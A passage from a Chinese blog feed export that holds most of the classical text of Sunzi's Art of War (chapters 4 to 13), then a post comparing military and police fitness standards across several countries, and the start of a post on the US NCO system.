<p>　　故知胜有五：知可以战与不可以战者胜，识众寡之用者胜，上下同欲者胜，以虞待不虞者胜，将能而君不御者胜。此五者，知胜之道也。</p>
<p>　　故曰：知彼知己者，百战不殆；不知彼而知己，一胜一负，不知彼，不知己，每战必殆。</p>
<h4 id="四、军形篇"><a href="#四、军形篇" class="headerlink" title="四、军形篇"></a>四、军形篇</h4><p>孙子曰：昔之善战者，先为不可胜，以待敌之可胜。不可胜在己，可胜在敌。故善战者，能为不可胜，不能使敌之可胜。故曰：胜可知，而不可为。</p>
<p>　　不可胜者，守也；可胜者，攻也。守则不足，攻则有余（竹简为：守则有余，攻则不足）。善守者，藏于九地之下，善攻者，动于九天之上，故能自保而全胜也。</p>
<p>　　见胜不过众人之所知，非善之善者也；战胜而天下曰善，非善之善者也。故举秋毫不为多力，见日月不为明目，闻雷霆不为聪耳。古之所谓善战者，胜于易胜者也。故善战者之胜也，无智名，无勇功。故其战胜不忒，不忒者，其所措必胜，胜已败者也。故善战者，立于不败之地，而不失敌之败也。是故胜兵先胜而后求战，败兵先战而后求胜。善用兵者，修道而保法，故能为胜败之政。</p>
<p>　　兵法：一曰度，二曰量，三曰数，四曰称，五曰胜。地生度，度生量，量生数，数生称，称生胜。故胜兵若以镒称铢，败兵若以铢称镒。胜者之战民也，若决积水于千仞之溪者，形也。</p>
<h4 id="五、兵势篇"><a href="#五、兵势篇" class="headerlink" title="五、兵势篇"></a>五、兵势篇</h4><p>孙子曰：凡治众如治寡，分数是也；斗众如斗寡，形名是也；三军之众，可使必受敌而无败者，奇正是也；兵之所加，如以碫投卵者，虚实是也。　</p>
<p>　　凡战者，以正合，以奇胜。故善出奇者，无穷如天地，不竭如江海。终而复始，日月是也。死而更生，四时是也。声不过五，五声之变，不可胜听也；色不过五，五色之变，不可胜观也；味不过五，五味之变，不可胜尝也；战势不过奇正，奇正之变，不可胜穷也。奇正相生，如循环之无端，孰能穷之哉！　</p>
<p>　　激水之疾，至于漂石者，势也；鸷鸟之疾，至于毁折者，节也。故善战者，其势险，其节短。势如扩弩，节如发机。纷纷纭纭，斗乱而不可乱；浑浑沌沌，形圆而不可败。乱生于治，怯生于勇，弱生于强。治乱，数也；勇怯，势也；强弱，形也。　</p>
<p>　　故善动敌者，形之，敌必从之；予之，敌必取之。以利动之，以卒待之。故善战者，求之于势，不责于人故能择人而任势。任势者，其战人也，如转木石。木石之性，安则静，危则动，方则止，圆则行。　</p>
<p>　　故善战人之势，如转圆石于千仞之山者，势也。</p>
<h4 id="六、虚实篇"><a href="#六、虚实篇" class="headerlink" title="六、虚实篇"></a>六、虚实篇</h4><p>孙子曰：凡先处战地而待敌者佚，后处战地而趋战者劳，故善战者，致人而不致于人。能使敌人自至者，利之也；能使敌人不得至者，害之也，故敌佚能劳之，饱能饥之，安能动之。出其所不趋，趋其所不意。行千里而不劳者，行于无人之地也。</p>
<p>　　攻而必取者，攻其所不守也；守而必固者，守其所不攻也。故善攻者，敌不知其所守；善守者，敌不知其所攻。微乎微乎，至于无形。神乎神乎，至于无声，故能为敌之司命。进而不可御者，冲其虚也；退而不可追者，速而不可及也。故我欲战，敌虽高垒深沟，不得不与我战者，攻其所必救也；我不欲战，画地而守之，敌不得与我战者，乖其所之也。</p>
<p>　　故形人而我无形，则我专而敌分。我专为一，敌分为十，是以十攻其一也，则我众而敌寡；能以众击寡者，则吾之所与战者，约矣。吾所与战之地不可知，不可知，则敌所备者多；敌所备者多，则吾所与战者，寡矣。</p>
<p>　　故备前则后寡，备后则前寡，备左则右寡，备右则左寡，无所不备，则无所不寡。寡者，备人者也；众者，使人备己者也。</p>
<p>　　故知战之地，知战之日，则可千里而会战。不知战地，不知战日，则左不能救右，右不能救左，前不能救后，后不能救前，而况远者数十里，近者数里乎？</p>
<p>　　以吾度之，越人之兵虽多，亦奚益于胜败哉？故曰：胜可为也。敌虽众，可使无斗。故策之而知得失之计，作之而知动静之理，形之而知死生之地，角之而知有余不足之处。故形兵之极，至于无形。无形，则深间不能窥，智者不能谋。因形而错胜于众，众不能知；人皆知我所以胜之形，而莫知吾所以制胜之形。故其战胜不复，而应形于无穷。</p>
<p>　　夫兵形象水，水之形，避高而趋下，兵之形，避实而击虚。水因地而制流，兵因敌而制胜。故兵无常势，水无常形，能因敌变化而取胜者，谓之神。</p>
<p>　　故五行无常胜，四时无常位，日有短长，月有死生。</p>
<h4 id="七、军争篇"><a href="#七、军争篇" class="headerlink" title="七、军争篇"></a>七、军争篇</h4><p>孙子曰：凡用兵之法，将受命于君，合军聚众，交和而舍，莫难于军争。军争之难者，以迂为直，以患为利。　</p>
<p>　　故迂其途，而诱之以利，后人发，先人至，此知迂直之计者也。军争为利，军争为危。举军而争利则不及，委军而争利则辎重捐。是故卷甲而趋，日夜不处，倍道兼行，百里而争利，则擒三将军，劲者先，疲者后，其法十一而至；五十里而争利，则蹶上将军，其法半至；三十里而争利，则三分之二至。是故军无辎重则亡，无粮食则亡，无委积则亡。故不知诸侯之谋者，不能豫交；不知山林、险阻、沮泽之形者，不能行军；不用乡导者，不能得地利。故兵以诈立，以利动，以分和为变者也。故其疾如风，其徐如林，侵掠如火，不动如山，难知如阴，动如雷震。掠乡分众，廓地分利，悬权而动。先知迂直之计者胜，此军争之法也。　</p>
<p>　　《军政》曰：“言不相闻，故为之金鼓；视不相见，故为之旌旗。”夫金鼓旌旗者，所以一民之耳目也。民既专一，则勇者不得独进，怯者不得独退，此用众之法也。故夜战多金鼓，昼战多旌旗，所以变人之耳目也。　</p>
<p>　　三军可夺气，将军可夺心。是故朝气锐，昼气惰，暮气归。善用兵者，避其锐气，击其惰归，此治气者也。以治待乱，以静待哗，此治心者也。以近待远，以佚待劳，以饱待饥，此治力者也。无邀正正之旗，勿击堂堂之阵，此治变者也。　</p>
<p>　　故用兵之法，高陵勿向，背丘勿逆，佯北勿从，锐卒勿攻，饵兵勿食，归师勿遏，围师遗阙，穷寇勿迫，此用兵之法也。</p>
<h4 id="八、九变篇"><a href="#八、九变篇" class="headerlink" title="八、九变篇"></a>八、九变篇</h4><p>孙子曰：凡用兵之法，将受命于君，合军聚众。圮地无舍，衢地交合，绝地无留，围地则谋，死地则战，途有所不由，军有所不击，城有所不攻，地有所不争，君命有所不受。　</p>
<p>　　故将通于九变之利者，知用兵矣；将不通九变之利，虽知地形，不能得地之利矣；治兵不知九变之术，虽知五利，不能得人之用矣。　</p>
<p>　　是故智者之虑，必杂于利害，杂于利而务可信也，杂于害而患可解也。是故屈诸侯者以害，役诸侯者以业，趋诸侯者以利。故用兵之法，无恃其不来，恃吾有以待之；无恃其不攻，恃吾有所不可攻也。　</p>
<p>　　故将有五危，必死可杀，必生可虏，忿速可侮，廉洁可辱，爱民可烦。凡此五者，将之过也，用兵之灾也。覆军杀将，必以五危，不可不察也。</p>
<h4 id="九、行军篇"><a href="#九、行军篇" class="headerlink" title="九、行军篇"></a>九、行军篇</h4><p>孙子曰：凡处军相敌：绝山依谷，视生处高，战隆无登，此处山之军也。绝水必远水；客绝水而来，勿迎之于水内，令半济而击之，利；欲战者，无附于水而迎客；视生处高，无迎水流，此处水上之军也。绝斥泽，惟亟去无留；若交军于斥泽之中，必依水草而背众树，此处斥泽之军也。平陆处易，而右背高，前死后生，此处平陆之军也。凡此四军之利，黄帝之所以胜四帝也。</p>
<p>　　凡军好高而恶下，贵阳而贱阴，养生而处实，军无百疾，是谓必胜。丘陵堤防，必处其阳，而右背之。此兵之利，地之助也。</p>
<p>　　上雨，水沫至，欲涉者，待其定也。</p>
<p>　　凡地有绝涧、天井、天牢、天罗、天陷、天隙，必亟去之，勿近也。吾远之，敌近之；吾迎之，敌背之。</p>
<p>　　军行有险阻、潢井、葭苇、山林、蘙荟者，必谨覆索之，此伏奸之所处也。</p>
<p>　　敌近而静者，恃其险也；远而挑战者，欲人之进也；其所居易者，利也。</p>
<p>　　众树动者，来也；众草多障者，疑也；鸟起者，伏也；兽骇者，覆也；尘高而锐者，车来也；卑而广者，徒来也；散而条达者，樵采也；少而往来者，营军也。</p>
<p>　　辞卑而益备者，进也；辞强而进驱者，退也；轻车先出居其侧者，陈也；无约而请和者，谋也；奔走而陈兵车者，期也；半进半退者，诱也。</p>
<p>　　杖而立者，饥也；汲而先饮者，渴也；见利而不进者，劳也；鸟集者，虚也；夜呼者，恐也；军扰者，将不重也；旌旗动者，乱也；吏怒者，倦也；粟马肉食，军无悬缻，不返其舍者，穷寇也；谆谆翕翕，徐与人言者，失众也；数赏者，窘也；数罚者，困也；先暴而后畏其众者，不精之至也；来委谢者，欲休息也。兵怒而相迎，久而不合，又不相去，必谨察之。</p>
<p>　　兵非益多也，惟无武进，足以并力、料敌、取人而已。夫惟无虑而易敌者，必擒于人。</p>
<p>　　卒未亲附而罚之，则不服，不服则难用也。卒已亲附而罚不行，则不可用也。故令之以文，齐之以武，是谓必取。令素行以教其民，则民服；令不素行以教其民，则民不服。令素行者，与众相得也。</p>
<h4 id="十、地形篇"><a href="#十、地形篇" class="headerlink" title="十、地形篇"></a>十、地形篇</h4><p>孙子曰：地形有通者，有挂者，有支者，有隘者，有险者，有远者。我可以往，彼可以来，曰通；通形者，先居高阳，利粮道，以战则利。可以往，难以返，曰挂；挂形者，敌无备，出而胜之；敌若有备，出而不胜，难以返，不利。我出而不利，彼出而不利，曰支；支形者，敌虽利我，我无出也；引而去之，令敌半出而击之，利。隘形者，我先居之，必盈之以待敌；若敌先居之，盈而勿从，不盈而从之。险形者，我先居之，必居高阳以待敌；若敌先居之，引而去之，勿从也。远形者，势均，难以挑战，战而不利。凡此六者，地之道也；将之至任，不可不察也。</p>
<p>　　故兵有走者，有弛者，有陷者，有崩者，有乱者，有北者。凡此六者，非天之灾，将之过也。夫势均，以一击十，曰走；卒强吏弱，曰弛，吏强卒弱，曰陷；大吏怒而不服，遇敌怼而自战，将不知其能，曰崩；将弱不严，教道不明，吏卒无常，陈兵纵横，曰乱；将不能料敌，以少合众，以弱击强，兵无选锋，曰北。凡此六者，败之道也；将之至任，不可不察也。</p>
<p>　　夫地形者，兵之助也。料敌制胜，计险厄远近，上将之道也。知此而用战者必胜，不知此而用战者必败。</p>
<p>　　故战道必胜，主曰无战，必战可也；战道不胜，主曰必战，无战可也。故进不求名，退不避罪，唯人是保，而利合于主，国之宝也。</p>
<p>　　视卒如婴儿，故可与之赴深溪；视卒如爱子，故可与之俱死。厚而不能使，爱而不能令，乱而不能治，譬若骄子，不可用也。</p>
<p>　　知吾卒之可以击，而不知敌之不可击，胜之半也；知敌之可击，而不知吾卒之不可以击，胜之半也；知敌之可击，知吾卒之可以击，而不知地形之不可以战，胜之半也。故知兵者，动而不迷，举而不穷。故曰：知彼知己，胜乃不殆；知天知地，胜乃不穷。</p>
<h4 id="十一、九地篇"><a href="#十一、九地篇" class="headerlink" title="十一、九地篇"></a>十一、九地篇</h4><p>孙子曰：用兵之法，有散地，有轻地，有争地，有交地，有衢地，有重地，有圮地，有围地，有死地。诸侯自战其地，为散地。入人之地不深者，为轻地。我得则利，彼得亦利者，为争地。我可以往，彼可以来者，为交地。诸侯之地三属，先至而得天下之众者，为衢地。入人之地深，背城邑多者，为重地。行山林、险阻、沮泽，凡难行之道者，为圮地。所由入者隘，所从归者迂，彼寡可以击吾之众者，为围地。疾战则存，不疾战则亡者，为死地。是故散地则无战，轻地则无止，争地则无攻，交地则无绝，衢地则合交，重地则掠，圮地则行，围地则谋，死地则战。</p>
<p>　　所谓古之善用兵者，能使敌人前后不相及，众寡不相恃，贵贱不相救，上下不相收，卒离而不集，兵合而不齐。合于利而动，不合于利而止。敢问：“敌众整而将来，待之若何？”曰：“先夺其所爱，则听矣。”</p>
<p>　　兵之情主速，乘人之不及，由不虞之道，攻其所不戒也。</p>
<p>　　凡为客之道：深入则专，主人不克；掠于饶野，三军足食；谨养而勿劳，并气积力，运兵计谋，为不可测。投之无所往，死且不北，死焉不得，士人尽力。兵士甚陷则不惧，无所往则固。深入则拘，不得已则斗。是故其兵不修而戒，不求而得，不约而亲，不令而信，禁祥去疑，至死无所之。吾士无余财，非恶货也；无余命，非恶寿也。令发之日，士卒坐者涕沾襟。偃卧者涕交颐。投之无所往者，诸、刿之勇也。</p>
<p>　　故善用兵者，譬如率然；率然者，常山之蛇也。击其首则尾至，击其尾则首至，击其中则首尾俱至。敢问：“兵可使如率然乎？”曰：“可。”夫吴人与越人相恶也，当其同舟而济，遇风，其相救也如左右手。是故方马埋轮，未足恃也；齐勇若一，政之道也；刚柔皆得，地之理也。故善用兵者，携手若使一人，不得已也。</p>
<p>　　将军之事：静以幽，正以治。能愚士卒之耳目，使之无知。易其事，革其谋，使人无识；易其居，迂其途，使人不得虑。帅与之期，如登高而去其梯；帅与之深入诸侯之地，而发其机，焚舟破釜，若驱群羊，驱而往，驱而来，莫知所之。聚三军之众，投之于险，此谓将军之事也。九地之变，屈伸之利，人情之理，不可不察。</p>
<p>　　凡为客之道：深则专，浅则散。去国越境而师者，绝地也；四达者，衢地也；入深者，重地也；入浅者，轻地也；背固前隘者，围地也；无所往者，死地也。</p>
<p>　　是故散地，吾将一其志；轻地，吾将使之属；争地，吾将趋其后；交地，吾将谨其守；衢地，吾将固其结；重地，吾将继其食；圮地，吾将进其涂；围地，“吾将塞其阙；死地，吾将示之以不活。</p>
<p>　　故兵之情，围则御，不得已则斗，过则从。是故不知诸侯之谋者，不能预交；不知山林、险阻、沮泽之形者，不能行军；不用乡导者，不能得地利。四五者，不知一，非霸王之兵也。夫霸王之兵，伐大国，则其众不得聚；威加于敌，则其交不得合。是故不争天下之交，不养天下之权，信己之私，威加于敌，故其城可拔，其国可隳。施无法之赏，悬无政之令，犯三军之众，若使一人。犯之以事，勿告以言；犯之以利，勿告以害。</p>
<p>　　投之亡地然后存，陷之死地然后生。夫众陷于害，然后能为胜败。</p>
<p>　　故为兵之事，在于顺详敌之意，并敌一向，千里杀将，此谓巧能成事者也。</p>
<p>　　是故政举之日，夷关折符，无通其使；厉于廊庙之上，以诛其事。敌人开阖，必亟入之。先其所爱，微与之期。践墨随敌，以决战事。是故始如处女，敌人开户，后如脱兔，敌不及拒。</p>
<h4 id="十二、火攻篇"><a href="#十二、火攻篇" class="headerlink" title="十二、火攻篇"></a>十二、火攻篇</h4><p>孙子曰：凡火攻有五：一曰火人，二曰火积，三曰火辎，四曰火库，五曰火队。行火必有因，烟火必素具。发火有时，起火有日。时者，天之燥也；日者，月在箕、壁、翼、轸也。凡此四宿者，风起之日也。</p>
<p>　　凡火攻，必因五火之变而应之。火发于内，则早应之于外。火发兵静者，待而勿攻，极其火力，可从而从之，不可从而止。火可发于外，无待于内，以时发之。火发上风，无攻下风。昼风久，夜风止。凡军必知有五火之变，以数守之。</p>
<p>　　故以火佐攻者明，以水佐攻者强。水可以绝，不可以夺。夫战胜攻取，而不修其功者凶，命曰费留。故曰：明主虑之，良将修之。非利不动，非得不用，非危不战。主不可以怒而兴师，将不可以愠而致战；合于利而动，不合于利而止。怒可以复喜，愠可以复悦；亡国不可以复存，死者不可以复生。故明君慎之，良将警之，此安国全军之道也。</p>
<h4 id="十三、用间篇"><a href="#十三、用间篇" class="headerlink" title="十三、用间篇"></a>十三、用间篇</h4><p>孙子曰：凡兴师十万，出征千里，百姓之费，公家之奉，日费千金；内外骚动，怠于道路，不得操事者，七十万家。相守数年，以争一日之胜，而爱爵禄百金，不知敌之情者，不仁之至也，非人之将也，非主之佐也，非胜之主也。故明君贤将，所以动而胜人，成功出于众者，先知也。先知者，不可取于鬼神，不可象于事，不可验于度，必取于人，知敌之情者也。</p>
<p>　　故用间有五：有因间，有内间，有反间，有死间，有生间。五间俱起，莫知其道，是谓神纪，人君之宝也。因间者，因其乡人而用之。内间者，因其官人而用之。反间者，因其敌间而用之。死间者，为诳事于外，令吾间知之，而传于敌间也。生间者，反报也。</p>
<p>　　故三军之事，莫亲于间，赏莫厚于间，事莫密于间。非圣智不能用间，非仁义不能使间，非微妙不能得间之实。微哉！微哉！无所不用间也。间事未发，而先闻者，间与所告者皆死。（莫亲于间：指没有比间谍更应成为亲信了。赏莫厚于间：指没有比间谍更应该得到丰富的奖赏了。事莫密于间：没有经间谍的事更应该保守机密了。间事未发：用间之事还没有开始进行。间与所告者皆死：间谍和告知用间之事的人都要处死。）</p>
<p>　　凡军之所欲击，城之所欲攻，人之所欲杀，必先知其守将，左右，谒者，门者，舍人之姓名，令吾间必索知之。</p>
<p>　　必索敌人之间来间我者，因而利之，导而舍之，故反间可得而用也。因是而知之，故乡间、内间可得而使也；因是而知之，故死间为诳事，可使告敌。因是而知之，故生间可使如期。五间之事，主必知之，知之必在于反间，故反间不可不厚也。</p>
<p>　　昔殷之兴也，伊挚在夏；周之兴也，吕牙在殷。故惟明君贤将，能以上智为间者，必成大功。此兵之要，三军之所恃而动也。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|《孙子兵法》研究</a></li>
<li><a href="https://riboseyim.github.io/2020/02/08/Commander-Art-Of-War-SuYu/" target="_blank" rel="noopener">讲武堂|粟裕的军事谋略与指挥艺术</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://ctext.org/wiki.pl?if=gb&amp;res=3&amp;remap=gb" target="_blank" rel="noopener">《纪效新书》| 明·戚继光 | 四库全书本</a></li>
<li><a href="http://www.shuku.net:8082/novels/zhuanji/syzzhylu/syzzhylu.html" target="_blank" rel="noopener">《粟裕战争回忆录》 | 粟裕 </a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
      </tags>
  </entry>
  <entry>
    <title>外军研究|军警体能标准横向评测</title>
    <url>/2017/11/05/Commander-PHT-Stand/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>各国军人基础体能－通用指标横向评测</p>
<ul>
<li>现役Active Duty 军人（中国大陆、英国、美国、台军、日军）</li>
<li>中国田径协会业余运动员标准</li>
</ul>
<a id="more"></a>
<h2 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h2><p>总体来看，世界各大国、强国都非常重视战斗人员的基础体能训练。<br>各国标准各有特色，跑步单项上的基准线差不多，特种部队的标准基本上参考一般专业运动员的要求。</p>
<p>中国军队25岁以下战斗人员标准，高于一般发达国家标准。区别在于外军的军官要求要高于普通士兵，中高级军官的标准也要达到相当高的水准，共军正好相反，尤其是40岁以上军官的体能标准远远落后于世界平均水平。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Global-PHT-Stand-2016.png" alt></p>
<h4 id="中国"><a href="#中国" class="headerlink" title="中国"></a>中国</h4><p>常规：徒手五公里:23分钟及格.21分钟优秀, 海军陆战队20分<br>雪豹：35公斤十公里<br>特种部队：每五天军队铁人三项：负重40kg跑2000，负重20kg游2000，负重20kg骑车5000</p>
<blockquote>
<p>解放军四总部联合颁发《军事体育训练改革发展纲要（2015－2020年）》，强调从健全管理体系、改革训练内容、改进训练方法、完善训练制度、加强队伍建设、改善训练条件等方面聚焦用力，提高部队军事体育训练水平。</p>
</blockquote>
<p>《军事体育训练改革发展纲要（2015－2020年）》提出在全军逐步推行军人体重控制计划，实行体重强制达标制度，把军人体重达标与晋职晋级晋衔挂钩。目标到2020年要使“官兵体质水平全面提高。体重达标率达到95%以上，基本消除体重超标现象”。</p>
<h4 id="台湾"><a href="#台湾" class="headerlink" title="台湾"></a>台湾</h4><p>3千米徒手：</p>
<p>16分钟内（现行）  14分钟（新标准，不确认是否意实施，又有说法是18分钟）</p>
<h4 id="美军-USA"><a href="#美军-USA" class="headerlink" title="美军 USA"></a>美军 USA</h4><p>美国海军陆战队：3英里 18分钟满分 28分钟及格</p>
<p>英国陆军：(男)10分30秒内跑完2400米（女）13分钟内跑完2400米</p>
<p>美军《军官晋升条例》中明确规定，军人体能达标与晋升挂钩，连续3次体能考核不达标者即退出现役。</p>
<p>美军的体能训练，每名军官的年均体能训练时间都在510小时以上。</p>
<h4 id="英军-UK"><a href="#英军-UK" class="headerlink" title="英军 UK"></a>英军 UK</h4><p>2014年英国国防部数据，过去3年，英国陆军有超过3.2万人没通过基础体能测验。</p>
<p>这项测验要求30岁以下的男性官兵在两分钟内做50次仰卧起坐，在两分钟内做44个俯卧撑，还得在10分30秒内跑完2400米。</p>
<p>女性军人做50次仰卧起坐，21个俯卧撑，在13分钟内跑完2400米。英军陆军每年还有一次急行军测验，官兵要背着25公斤重的背包在两小时内走完12公里……</p>
<p><strong>英国军官的体能训练标准要求比士兵高</strong></p>
<p>陆军40岁以下的军官每周要进行一次全副武装的5英里行军，3次体能训练，一次计时的3英里跑步。英国新兵入伍后，通常要在专门的组织机构中进行12至25周的共同课目和专业训练，而后补入部队。为调动年轻人的训练激情，英军还为新兵设置了冒险性训练，如登山、攀岩、潜水、滑雪、跳伞，以及到极地寒区、热带丛林、沙漠地带进行野外生存训练等，激发新兵的训练热情。</p>
<h4 id="俄罗斯联邦国防军"><a href="#俄罗斯联邦国防军" class="headerlink" title="俄罗斯联邦国防军"></a>俄罗斯联邦国防军</h4><blockquote>
<p>俄罗斯国防部也于2009年颁布了《俄联邦武装力量体能训练条例》，并开始实施一项“七年计划”，在全军严格执行体能训练大纲，以提高作战能力。根据该条例，所有军人每天都必须进行一个小时的体育锻炼以增强体能素质。与此同时，大力开展包括游泳在内的各种运动项目，力争保证每一位官兵在掌握基本技能的同时，再精通一项军事体育课目，以达到为战斗力服务的目的。</p>
</blockquote>
<h4 id="香港特警"><a href="#香港特警" class="headerlink" title="香港特警"></a>香港特警</h4><p>由于特殊的历史背景，香港的警察武装兼具警察和特种部队双重角色。<br>总体按照英军标准建设，同时参考美国海军陆战队设置。<br>SDU/机场特警（第一阶段遴选资格）</p>
<p>4.8公里跑步（最低丙级）：甲级‧18分钟以下、乙级‧18-20分钟、丙级‧21-24分钟、丁级‧24分钟以上<br>10公里跑步测试：时间限制于47分钟内完成</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="军事史"><a href="#军事史" class="headerlink" title="军事史"></a>军事史</h4><ul>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-CN/" target="_blank" rel="noopener">中国军事史 | Military History of China</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">美国军事史 | Military History of United States</a></li>
<li><a href="https://riboseyim.github.io/2017/01/30/History-TaipingHeavenly/" target="_blank" rel="noopener">太平天国史</a></li>
<li><a href="https://riboseyim.github.io/2019/06/07/History-Military-USA/" target="_blank" rel="noopener">私人历史文献 | 弗吉尼亚笔记</a></li>
<li><a href="https://riboseyim.github.io/2017/10/22/History-Qing-ZhangJiXing/" target="_blank" rel="noopener">私人历史文献 | 时晴斋主人自叙年谱</a></li>
<li><a href="https://riboseyim.github.io/2017/05/28/History-Caoyun/" target="_blank" rel="noopener">黄仁宇:《明代的漕运》</a></li>
</ul>
<h4 id="体能训练"><a href="#体能训练" class="headerlink" title="体能训练"></a>体能训练</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">Physical Training | 美军体能训练观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand" target="_blank" rel="noopener">Physical Training | 军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.com/2016/04/26/PHT-Running//">Physical Training | 训练项目：跑步</a></li>
<li><a href="https://riboseyim.com/2019/05/19/PHT-Skipping/">Physical Training | 训练项目：跳绳</a></li>
<li><a href="http://www.jianshu.com/p/6a2fea20b57b" target="_blank" rel="noopener">Physical Training | 跑步路线推荐</a></li>
<li><a href="https://riboseyim.com/2016/04/26/Visualization-RunningApp/">Physical Training | 跑步应用评测</a></li>
</ul>
<h4 id="讲武堂"><a href="#讲武堂" class="headerlink" title="讲武堂"></a>讲武堂</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-Art-Of-War-Chinese/" target="_blank" rel="noopener">讲武堂|中国传统兵法摘要</a></li>
<li><a href="https://riboseyim.github.io/2020/02/04/Commander-Art-Of-War/" target="_blank" rel="noopener">讲武堂|《孙子兵法》研究</a></li>
<li><a href="https://riboseyim.github.io/2020/02/08/Commander-Art-Of-War-SuYu/" target="_blank" rel="noopener">讲武堂|粟裕的军事谋略与指挥艺术</a></li>
<li><a href="https://riboseyim.github.io/2017/08/15/Commander-Sergeant/" target="_blank" rel="noopener">外军研究|美军士官制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-USArmy/" target="_blank" rel="noopener">外军研究|军警体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/11/05/Commander-PHT-Stand/" target="_blank" rel="noopener">外军研究|军队体能标准横向评测</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/Medal/" target="_blank" rel="noopener">外军研究|美军授勋和嘉奖制度观察</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Medal-HK/" target="_blank" rel="noopener">太公分猪肉—香港特区授勋和嘉奖制度批判</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.thebalancecareers.com/u-s-army-physical-fitness-requirements-4055631" target="_blank" rel="noopener">U.S. Army Physical Fitness Requirements | Physical Fitness Charts for Males Age 27-31</a></li>
<li><a href="#">为什么美军上将必须参加体能测试</a></li>
<li><a href="#">国防部网站：战斗力有刻度 201504</a></li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/image_824254815542_3.png" alt></p>
]]></content>
      <categories>
        <category>军事战略</category>
      </categories>
      <tags>
        <tag>Manager</tag>
        <tag>讲武堂</tag>
        <tag>Commander</tag>
        <tag>Intelligence</tag>
        <tag>运动</tag>
        <tag>体能训练</tag>
      </tags>
  </entry>
  <entry>
    <title>外军研究|美军士官制度研究</title>
    <url>/2017/08/15/Commander-Sergeant/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><blockquote>
<p>在世界军事史上，士官制度已经走过五百多年的历史。<br>经过长期演化，史上最大的职业化军队－美军，已经把士官制度运用得炉火纯青。<br>对这一制度的研究，不仅是组织管理的有效手段，也是观察西方文化的绝佳窗口。</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/USArmy-Sergeant-AirForce-1.png" alt></p>
<a id="more"></a>
